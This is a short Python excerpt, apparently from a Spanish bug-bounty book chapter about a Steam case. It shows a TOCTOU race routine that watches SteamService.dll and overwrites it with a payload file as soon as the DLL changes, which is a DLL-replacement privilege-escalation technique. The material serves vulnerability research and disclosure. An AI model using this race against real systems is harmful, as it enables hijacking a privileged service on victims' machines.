# Extraído de: LibroBugBounty/cap-21-caso-steam.md
def monitor_and_race():
    """Monitor + intento de carrera TOCTOU."""
    target = os.path.join(STEAM_DIR, "bin", "SteamService.dll")
    # Monitoring loop con polling de 50ms
    prev_mtime = os.path.getmtime(target)
    for _ in range(1200):  # 60 segundos
        time.sleep(0.05)   # 50ms
        mtime = os.path.getmtime(target)
        if mtime != prev_mtime:
            # El fichero cambio! Intentar sustitucion
            shutil.copy2(payload, target)
            break
        prev_mtime = mtime
